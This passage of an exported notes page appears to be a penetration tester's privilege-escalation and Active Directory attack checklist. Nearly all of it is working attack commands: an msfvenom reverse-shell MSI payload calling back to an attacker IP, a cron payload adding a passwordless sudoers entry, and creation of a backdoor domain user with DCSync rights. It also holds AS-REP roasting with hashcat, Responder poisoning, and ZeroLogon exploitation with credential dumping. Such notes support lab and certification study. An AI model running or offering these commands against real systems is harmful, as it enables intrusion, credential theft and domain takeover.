id="84acaee3-ba58-4de1-8adf-63ec26814da6" class="">generate a payload and send it as .msi file</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3c2dc2e0-f7f2-41dc-ba81-ec7b778d81de" class="code"><code class="language-PowerShell">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="177e0956-ea18-46da-a78c-d195da55a462" class="code"><code class="language-PowerShell">reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</code></pre><ul id="f757c1aa-1998-4a1b-9c4a-edf28b3c5db5" class="toggle"><li><details open=""><summary>steps</summary><p id="01c3bf74-a988-4393-ac0b-8e563b1eae43" class=""><code>msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.5 LPORT=443 -f msi &gt; shell.msi</code></p><p id="8154f2ac-12ef-4341-b684-c56321e6fa4e" class=""><code>msiexec /quiet /qn /i shell.msi</code></p></details></li></ul></details></li></ul></div></li></ul><ul id="3c395da1-df49-4bb2-adb3-42adef6a8508" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Saved credentials - <code>cmdkey /list</code></span><div class="indented"><ul id="b75c85d2-5454-41e4-b752-c3a58668e41a" class="toggle"><li><details open=""><summary>Command</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7ca8f78e-3407-409b-8354-934b45860739" class="code"><code class="language-PowerShell">runas /savecred /user:Administrator &quot;c:\windows\temp\backdoor.exe&quot;</code></pre></details></li></ul><ul id="e70db78e-6c88-4ad0-912b-5c8bfadcad50" class="toggle"><li><details open=""><summary>saved password</summary><p id="58905d52-1979-4425-bab9-d16eb39e1d85" class="">reg query HKLM /f pass /t REG_SZ /s</p></details></li></ul></div></li></ul><ul id="38a7a04f-0bbe-4c65-909a-e5fa045f05ae" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">winPEAS</span><div class="indented"></div></li></ul><ul id="173686af-f635-8090-a226-d70ca6e0ab6b" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">dir -force</span><div class="indented"></div></li></ul><ul id="caa805a6-44f1-4331-bd73-254dcbf5b3f6" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">PowerUP</span><div class="indented"></div></li></ul><ul id="a712a2ac-eb7b-4450-bda3-5c5a265c0a30" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">kernel exploits</span><div class="indented"><ul id="3cd931fd-6acc-49f3-a684-da6abce8f2ce" class="toggle"><li><details open=""><summary>Sherlock</summary><p id="3304d241-7b4c-49a2-8d25-b396c598755a" class=""><code>Set-ExecutionPolicy -ExecutionPolicy bypass -Scope CurrentUser</code></p><p id="c8ec456e-c19e-4466-a4ca-e409ca2d98be" class=""><code>Import-Module -name C:\path\to\sherlock</code></p><p id="39a434ff-c886-4c6a-8bd9-6e23aa17ade8" class=""><code>Find-AllVulns</code></p></details></li></ul><ul id="5035ab7a-f3f4-4585-9634-dbca800aca26" class="toggle"><li><details open=""><summary>Watson</summary><ul id="348a85b9-054b-40c0-a277-f85e26926111" class="bulleted-list"><li style="list-style-type:disc">run the exe file</li></ul></details></li></ul></div></li></ul></details></li></ul><ul id="350d2518-e44f-473f-89ab-3bcd1a91bfd2" class="toggle"><li><details open=""><summary>Linux</summary><ul id="d9dd6ae0-6b02-4179-bdc7-95e7705c36bb" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked"><code>history</code></span><div class="indented"></div></li></ul><ul id="aa92ebf2-3f76-4039-b100-31ceca63a960" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Check permissions - <code>sudo -l</code></span><div class="indented"></div></li></ul><ul id="d96cbc9d-ccdd-40c0-a17d-c9b127687ca1" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">cat /etc/issue &amp;&amp; uname -a (check groups)</span><div class="indented"></div></li></ul><ul id="0297ab03-0349-4723-9399-a7b103c14f7a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Cronjobs - </span><div class="indented"><p id="cf58d70c-bef5-41e3-bbcb-69f1a494fd12" class="">check if path is modifiable</p><p id="685bb3cf-d826-4341-bd41-3c75ce90220e" class=""><code><strong>ls -lah /etc/cron*</strong></code></p><p id="db9afabb-61f8-45c3-ac1d-ce9e7b360997" class=""><code>cat /etc/crontab</code></p><p id="8bfdf028-6f6b-46f7-a9ba-4773c00db65e" class=""><code>ls -al /etc/ | grep cron</code></p><ul id="a789f549-0c04-4c7d-9192-54d4a4e74948" class="toggle"><li><details open=""><summary>Payload</summary><p id="874b848d-4fe9-4703-ad29-b1c8f7944d03" class=""><code>echo &#x27;echo &quot; useradm ALL=(ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#x27; &gt; </code><code><a href="http://cleanup.sh/">cleanup.sh</a></code></p></details></li></ul></div></li></ul><ul id="f55b3e2c-3fab-4724-b5bf-f625f0b98fca" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Processes and services -<code><strong>ps axu</strong></code></span><div class="indented"></div></li></ul><ul id="15d686af-f635-80fd-a479-d0ba20942b1d" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Pspy</span><div class="indented"><ul id="15d686af-f635-80f7-b60f-c0103c9bd143" class="bulleted-list"><li style="list-style-type:disc">See running processes like private crontabs, hardcoded credentials, etc.</li></ul><figure id="15d686af-f635-807f-9221-ca956026902a"><a href="https://github.com/DominicBreuker/pspy?tab=readme-ov-file#pspy---unprivileged-linux-process-snooping" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions</div><div class="bookmark-description">Monitor linux processes without root permissions. Contribute to DominicBreuker/pspy development by creating an account on GitHub.</div></div><div class="bookmark-href"><img src="https://github.com/fluidicon.png" class="icon bookmark-icon"/>https://github.com/DominicBreuker/pspy?tab=readme-ov-file#pspy---unprivileged-linux-process-snooping</div></div><img src="https://opengraph.githubassets.com/6796083bbce19a2f77c7c82a24888b13492805f0eb856bcf3b883da64c5d0528/DominicBreuker/pspy" class="bookmark-image"/></a></figure></div></li></ul><ul id="de110a1f-8959-4a5f-96b9-0ab46c23cef0" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Listening ports -<code><strong>ss -anp</strong></code></span><div class="indented"></div></li></ul><ul id="8f19f1f4-a4f3-4f72-a230-7e2153bb040a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">find SUID binaries - <code>find / -perm -u=s -type f 2&gt;/dev/null</code></span><div class="indented"></div></li></ul><ul id="7cb3bbb5-bace-4ea3-a9b3-5bc57d4de3bf" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">sudo tokens</span><div class="indented"><ul id="d312f99c-54c4-479b-9c64-6579e2e5efd6" class="toggle"><li><details open=""><summary>Process</summary><ul id="37c6343b-1fef-402c-bb79-9b349020c155" class="bulleted-list"><li style="list-style-type:disc"><code>ps -e</code> - check for sudo token with same uid</li></ul><ul id="3fff671e-ec0c-47ae-8e91-a510dd89d1ff" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/nongiach/sudo_inject">https://github.com/nongiach/sudo_inject</a></li></ul></details></li></ul></div></li></ul><ul id="951dbfbf-b4e2-43f3-8307-d38a0a745574" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">writeable files -</span><div class="indented"><p id="92dd047c-db8f-4899-b669-c2e5a73527ca" class=""><code><strong>find / -writable -type d 2&gt;/dev/null</strong></code></p><p id="c7b39854-d4f2-4a83-aab8-6a472df8f9ee" class=""><code><code>find / -type f -writable </code></code><code><strong>2&gt;/dev/null</strong></code></p></div></li></ul><ul id="a66ee081-8f6d-445e-b30d-ebe33e43119a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">linpeas</span><div class="indented"></div></li></ul><ul id="c9fda577-aba1-47da-8570-88a8ff16bc36" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Check for writeable files which will get executed everytime a new shell launched - <code>ls -l /etc/profile /etc/profile.d/</code></span><div class="indented"></div></li></ul><ul id="43b10fb3-da00-4c1b-b860-1fb6a1b8dd1b" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked"><code>ps aux | grep tmux</code></span><div class="indented"></div></li></ul><ul id="43f009c9-ab6e-4025-af07-3e15500c434f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked"><code>/usr/share/linux-exploit-suggester/linux-exploit-suggester.sh -k #</code></span><div class="indented"></div></li></ul><ul id="baf30a7e-ba77-44e8-8c2f-6e22c692d0a1" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">unmounted disks - <code><strong>mountvol</strong></code></span><div class="indented"></div></li></ul><ul id="2f095f50-b998-4ce0-8c85-76366e9b6e90" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">installed applications - <code><strong>dpkg -l</strong></code></span><div class="indented"></div></li></ul><ul id="882c6be2-4d79-4637-b480-32e2ed14258c" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">file system -<code><strong>cat /etc/fstab</strong></code></span><div class="indented"></div></li></ul><ul id="e5a95485-cb10-45e8-8933-717c648d1b13" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">users with login - <code>grep -vE &quot;nologin|false&quot; /etc/passwd</code></span><div class="indented"></div></li></ul></details></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Active Directory</summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">AD Misc</summary><div class="indented"><ul id="172686af-f635-80bc-a052-f11e1103a1a6" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">CMD commands</span><div class="indented"><ul id="02f97451-2f21-4b3b-8221-3f0c6bee8797" class="toggle"><li><details open=""><summary>Commands</summary><p id="3788b161-4820-47f1-82f9-857c389b81fd" class="">Create User - <code>net user /domain /ADD tester password123</code></p><p id="172686af-f635-8023-85cf-cc5c1a5b2ff1" class=""><code>net group &quot;Exchange Windows Permissions&quot; /ADD &quot;tester&quot;</code></p><p id="172686af-f635-8034-b600-fea6552d0fcf" class="">Allow remote login - <code>net localgroup &quot;Remote Desktop Users&quot; /ADD &quot;tester&quot;</code></p><p id="172686af-f635-80a8-b28d-eae158d891f2" class="">Remote manager - <code>net localgroup /add &quot;Remote Management Users&quot; tester</code></p><p id="172686af-f635-80c7-a52c-e4727936dca0" class="">Create User - <code>$SecPass = ConvertTo-SecureString &#x27;password123&#x27; -AsPlainText -Force</code></p><p id="172686af-f635-80d0-a877-e2c246615fdb" class=""><code>$Cred = New-Object System.Management.Automation.PSCredential(&#x27;htb.local\\alan&#x27;, $SecPass)</code></p><p id="172686af-f635-800e-9146-c4f4508edd28" class=""><code>Add-ObjectACL -PrincipalIdentity tester -Credential $Cred -Rights DCSync</code></p></details></li></ul></div></li></ul><ul id="176686af-f635-8040-82f8-e39b7869f554" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Modify AD DNS records</span><div class="indented"><ul id="176686af-f635-80c3-a99e-dc5faf8d358a" class="toggle"><li><details open=""><summary>steps</summary><p id="176686af-f635-806c-96e3-d75b382ee60d" class=""><code>git clone https://github.com/dirkjanm/krbrelayx</code></p><p id="176686af-f635-807d-bc0a-f6f1a6e7c1da" class=""><code>python3 </code><code><a href="http://dnstool.py/">dnstool.py</a></code><code> -u &lt;domain&gt;\\&lt;user&gt; -p &lt;password&gt; --action add --record &lt;record name&gt; --data &lt;IP&gt; --type A &lt;IP&gt;</code></p></details></li></ul></div></li></ul><ul id="176686af-f635-8073-acdf-d2647d7e780f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Fix time</span><div class="indented"><ul id="172686af-f635-801b-b2e6-ce3c01bdfa8c" class="toggle"><li><details open=""><summary>steps</summary><p id="172686af-f635-809c-b256-c6e26bce698b" class=""><code><strong>sudo timedatectl set-ntp off</strong></code></p><p id="172686af-f635-80d8-b873-ee990babe0f4" class=""><code><strong>sudo rdate -n &lt;IP&gt;</strong></code></p></details></li></ul></div></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">AD Enum</summary><div class="indented"><ul id="8726c0e2-ca27-4764-928e-74b71ade7bf4" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Powerview</span><div class="indented"><ul id="3b862d5b-8bc9-449f-addc-3fe3689c6c8d" class="toggle"><li><details open=""><summary>Commands</summary><ul id="7b1cab06-25c2-4d29-a40a-036f230312ab" class="bulleted-list"><li style="list-style-type:disc">powershell -ep bypass</li></ul><ul id="5059073c-86ef-4601-bf92-13a1da895c38" class="bulleted-list"><li style="list-style-type:disc">. .\PowerView.ps1</li></ul><ul id="c178991f-349e-4d01-9123-eb75678eaaad" class="bulleted-list"><li style="list-style-type:disc">ASREPRoastable users - <code>Get-NetUser -PreauthNotRequired</code></li></ul><ul id="f78b05a5-e6b7-44bc-9340-ef211b240dbb" class="bulleted-list"><li style="list-style-type:disc">Kerberoastable users - <code>Get-NetUser -SPN</code></li></ul><ul id="7ad2f09e-eb83-48f7-91fe-2861557efd1f" class="bulleted-list"><li style="list-style-type:disc">Get IPs - <code>Get-DomainComputer | % {Resolve-IPAddress -ComputerName $_.cn}</code></li></ul><ul id="92cdd50d-ce5a-4215-a2fc-b502e4f64cc9" class="bulleted-list"><li style="list-style-type:disc">Get-NetDomain</li></ul><ul id="5b20deb8-56f7-4fbc-aeb7-972ee59f8117" class="bulleted-list"><li style="list-style-type:disc">Get-NetDomainController</li></ul><ul id="192f944d-de5f-4fd3-b4b5-13b97b90663a" class="bulleted-list"><li style="list-style-type:disc">Get-DomainPolicy</li></ul><ul id="25f41476-2b09-4f4b-a25d-e8ec5db9d849" class="bulleted-list"><li style="list-style-type:disc">Get-NetUser</li></ul><ul id="cc6b0275-194c-49f5-ae6c-23db75d0d3c2" class="bulleted-list"><li style="list-style-type:disc">Get-NetUser | select cn,description,</li></ul><ul id="7cb8a575-8c01-449b-9132-fa93d6d51f77" class="bulleted-list"><li style="list-style-type:disc">Invoke-ShareFinder</li></ul><ul id="e4276e34-4af8-494b-b11c-0834d3cd6fc9" class="bulleted-list"><li style="list-style-type:disc">Get-NetGPO</li></ul></details></li></ul></div></li></ul><ul id="3740b18b-2b88-4fb6-adf0-e6316f787568" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">CMD commands</span><div class="indented"><ul id="45120582-ca91-44f1-a7ae-1f2e8dccc0f9" class="toggle"><li><details open=""><summary>Commands</summary><p id="97f8c33b-d805-4cd9-95fe-126b6fa8362f" class="">domain users - <code>net user /domain</code></p><p id="c2b02b5b-eb8d-4b24-93b9-9333493f5bd0" class="">domain groups - <code>net user /group</code></p><p id="cf064e0b-1a33-4bb6-94ae-fedb49773986" class="">domain admins - <code>net group /domain &quot;Domain Admins&quot;</code></p><p id="f2cb78c2-bacb-4d03-bd03-db5c741f3275" class="">workstation admins - <code>net group /domain Workstation_Admin</code></p><p id="ad8be5c3-2c8f-4ca8-983d-0718b1f95b7c" class=""><code>net localgroup</code></p><p id="fb327e97-8ddf-4d87-814b-516e25395085" class=""><code>net group /domain &quot;Domain Computers&quot;</code></p></details></li></ul></div></li></ul><ul id="014b67a9-09e1-4201-aa3d-4e3c74e856ae" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Import-Module</span><div class="indented"><ul id="30f9f3f2-9381-49df-a2da-b7c0e9bdf1a1" class="toggle"><li><details open=""><summary>Commands</summary><p id="cb086db7-62f4-4e11-9759-176e4f88a0c4" class=""><code>powershell -ep bypass</code></p><p id="ea64e445-96a3-4c23-99d5-9582de074d4c" class="">import module <code>Import-Module ActiveDirectory</code></p><ul id="719465e7-ad84-48e7-b6d3-6f6aace979fb" class="toggle"><li><details open=""><summary>Service Account</summary><p id="803c68ef-3fd2-4692-8d33-e56bb46471f8" class="">list service accounts - <code>Get-ADServiceAccount -Filter * -Properties *</code></p><p id="c3a724e7-ee82-49b5-83d2-d2c9ff52f6d6" class=""><code>Get-ADServiceAccount -Identity &#x27;svc_apache$&#x27; -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword</code></p></details></li></ul><ul id="04630224-3b2e-4a53-8f7e-2678a426116a" class="toggle"><li><details open=""><summary>AD Users</summary><p id="e461d173-7640-46d7-89a6-8025f795383f" class=""><code><strong>Get-ADUser -Filter * | Select SamAccountName</strong></code></p><p id="29dbf349-a397-4c29-99e0-a890bee5e3dc" class=""><code><strong>Get-ADUser -Filter *</strong></code></p></details></li></ul><ul id="ce2da2fb-a947-4e78-80c1-da960f8e498d" class="toggle"><li><details open=""><summary>AD Computers</summary><p id="dc7ad371-d52b-4484-ab33-de0f3aa4b7f7" class=""><code><strong>Get-AdComputer -Filter * | select Name</strong></code></p><p id="8bf3f51a-a0db-4d4d-992c-e61e715f3ca5" class=""><code><strong>Get-AdComputer -Filter *</strong></code></p></details></li></ul><p id="08451586-4da2-4d85-9398-5e077fbd4918" class=""><code>Get-ADPrincipalGroupMembership svc_apache$ | select name</code></p><p id="03c5acae-246f-441d-bde5-a4cfe1b73e4a" class=""><code><strong>Get-ADGroupMember -Identity &quot;DNSAdmins&quot; -Recursive</strong></code></p><p id="776e6db6-a6a3-4aec-a7e9-a33eed7f9217" class=""><code><strong>Get-ADGroup -Filter * | select name</strong></code></p></details></li></ul></div></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">AD Initial Access</summary><div class="indented"><ul id="4b8bcb19-f412-42a3-8c24-2648e272ff60" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">use <a href="http://GetNPUsers.py">GetNPUsers.py</a> to check for ASRep Roastable users (need valid user)</span><div class="indented"><ul id="09102f75-f492-460f-ae6c-71de2be33d24" class="toggle"><li><details open=""><summary>Command</summary><p id="6132b93f-858a-49f8-8f1b-1ea38f91b8e8" class=""><code>./GetNPUsers.py -dc-ip $IP -request &#x27;$domain/&#x27;</code></p><p id="7893e9d1-a433-48b0-9c47-3270cbf7f04c" class=""><code>sudo python3 </code><code><a href="http://getnpusers.py/">GetNPUsers.py</a></code><code> -usersfile usernames.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.11.1.20 &#x27;svcorp/&#x27;</code></p><p id="172686af-f635-80f6-bcb0-c4ab834ef5f0" class=""><code>hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt</code></p></details></li></ul></div></li></ul><ul id="dad23aa6-9caa-4822-8066-d921f29d96a5" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Responder for LLMNR Poisoning or SSRF</span><div class="indented"><ul id="b5564ad2-59c8-4478-b0f4-b7f184a4c692" class="toggle"><li><details open=""><summary>Command</summary><p id="57a4597c-be77-48ac-a9ee-d7551672a4fd" class="">sudo responder -I tun0</p></details></li></ul></div></li></ul><ul id="25d30378-0aa3-4ce5-ad09-46c822954ceb" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">LDAP with NetExec</span><div class="indented"><ul id="f5a6bcbe-2788-47dd-9451-8fe1f8a99a12" class="toggle"><li><details open=""><summary>commands</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="697c3221-b1fa-4f1c-b988-5d3836af88c7" class="code"><code class="language-JavaScript">nxc ldap &lt;IP&gt; -u &lt;User&gt; -p &lt;Password&gt; --kdcHost &lt;Host&gt;  --asreproast ASREPROAST
nxc ldap &lt;IP&gt; -u &lt;User&gt; -p &lt;Password&gt; --kdcHost &lt;Host&gt;  --groups
nxc ldap &lt;IP&gt; -u &lt;User&gt; -p &lt;Password&gt; --kdcHost &lt;Host&gt;  --kerberoasting KERBEROASTING
nxc ldap &lt;IP&gt; -u &lt;User&gt; -p &lt;Password&gt; --kdcHost &lt;Host&gt;  --password-not-required
nxc ldap &lt;IP&gt; -u &lt;User&gt; -p &lt;Password&gt; --kdcHost &lt;Host&gt;  --users

nxc ldap &lt;IP&gt; -u &lt;User&gt; -p &lt;Password&gt; --kdcHost &lt;Host&gt; -M get-desc-users
nxc ldap &lt;IP&gt; -u &lt;User&gt; -p &lt;Password&gt; --kdcHost &lt;Host&gt; -M laps
nxc ldap &lt;IP&gt; -u &lt;User&gt; -p &lt;Password&gt; --kdcHost &lt;Host&gt; -M ldap-signing
nxc ldap &lt;IP&gt; -u &lt;User&gt; -p &lt;Password&gt; --dns-server &lt;Host&gt; --bloodhound --collection All
nxc ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --gmsa</code></pre></details></li></ul></div></li></ul><ul id="6ffbfe3e-720d-4463-8432-16c38e7a9c7a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Kerbrute (get valid user)</span><div class="indented"></div></li></ul><ul id="12f686af-f635-807e-8e66-e676a162f0a6" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">GPP Vulnerability</span><div class="indented"><ul id="12f686af-f635-804b-b01b-e34d82690ab6" class="toggle"><li><details open=""><summary>Description</summary><ul id="12f686af-f635-800f-ae28-dc0e5e8778de" class="bulleted-list"><li style="list-style-type:disc">Microsoft GPP, used to modify windows/app settings that Group Policy can’t<ul id="12f686af-f635-80b9-a6bb-e09c7cc750af" class="bulleted-list"><li style="list-style-type:circle">normally in sysvol</li></ul></li></ul><ul id="12f686af-f635-8052-84d2-e6f12e6111b3" class="bulleted-list"><li style="list-style-type:disc">If account made with GPP, cpassword is encrypted password for account - AES key is weak (32 bits) and available online</li></ul><ul id="12f686af-f635-80df-b408-c2e3cd4e88c6" class="bulleted-list"><li style="list-style-type:disc">look for Groups.xml with cpassword in it</li></ul><ul id="12f686af-f635-8050-999c-d2f588166864" class="bulleted-list"><li style="list-style-type:disc">metasploit module: scanner/smb/smb_enum_gpp</li></ul></details></li></ul></div></li></ul><ul id="e23a0985-b44a-4b9d-b4e3-8515040ea2de" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">ZeroLogon</span><div class="indented"><ul id="aa70fb5b-c908-468d-b39b-1ba5a6026e54" class="toggle"><li><details open=""><summary>description</summary><p id="94260062-d70b-44b1-8bc7-dec50a486f75" class="">*CAN FUCK UP DC, MUST RESTORE PASSWORD</p><p id="b10e168b-883c-486d-9f22-1d1eb9ee495c" class="">checker - <a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><p id="a3b874cc-adce-4c90-ac12-de47d54aa7f8" class="">exploit - <a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><ol type="1" id="618c6ae2-4d6a-4fb3-b1ae-945e127eb3a6" class="numbered-list" start="1"><li><code>python3 zerologon_check.py &lt;DC NAME&gt; &lt;IP ADDRESS&gt;</code></li></ol><ol type="1" id="5ebb2c49-1dd1-4423-a191-fd208e53dada" class="numbered-list" start="2"><li><code>python3 cve-2020-1472-exploit.py &lt;DC NAME&gt; &lt;IP ADDRESS&gt;</code></li></ol><ol type="1" id="b9839c95-c716-4503-b340-6e47a1176d7e" class="numbered-list" start="3"><li><code>secretsdump.py -just-dc &lt;DOMAIN&gt;/&lt;DC NAME&gt;\$@&lt;IP ADDRESS&gt;</code></li></ol><ol type="1" id="2679c287-ad04-44d4-8543-539eed3be38b" class="numbered-list" start="4"><li>copy administrator hash</li></ol><ol type="1" id="cef68b1a-772d-4192-872d-900420e7ca44" class="numbered-list" start="5"><li><code>secretsdump.py administrator@&lt;IP ADDRESS&gt;</code> and copy plain_password_hex</li></ol><ol type="1" id="9c3acd2f-ec39-4f9b-a73b-47d1ef6272e0" class="numbered-list" start="6"><li><code>python3 restorepassword.py &lt;Domain&gt;/&lt;DC NAME&gt;@&lt;DC NAME&gt; -target-ip &lt;IP ADDRESS&gt; -hexpass &lt;plain_password_hex&gt;</code></li></ol></details></li></ul></div></li></ul><ul id="6cc16937-7835-49dd-9882-302c796e4038" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">PrintNightmare</span><div class="indented"><ul id="3d9136e0-66dd-4f1b-9628-c6547275c3da" class="toggle"><li><details open=""><summary>Description</summary><ul id="f4960dd5-566a-4813-87ed-85e31295054c" class="bulleted-list"><li style="list-style-type:disc">print spooler attack, requires user and potentially AV evasion</li></ul><ul id="3eb5f744-da36-40f6-b6fc-c2b52443dae0" class="bulleted-list"><li style="list-style-type:disc">user &gt; domain admin attack</li></ul><ul id="a9fd1096-931d-4639-b1e9-0f544b959668" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></li></ul><p id="5dab8bcd-bf58-4e9e-aa48-a86c1a95603e" class="">Check for vuln:</p><ol type="1" id="b2e14efd-b524-46c6-954a-301831b1987f" class="numbered-list" start="1"><li><code><a href="http://rpcdump.py">rpcdump.py</a></code><code> @&lt;ip address&gt; | egrep &#x27;MS-RPRN|MS-PAR&#x27;</code></li></ol><p id="c78f247e-caa6-4b86-a71d-87c7c01dda0b" class="">If same as below, is vulnerable</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ab3a0c32-1a30-4a49-ace3-f0be2808fc66" class="code"><code class="language-JavaScript">Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
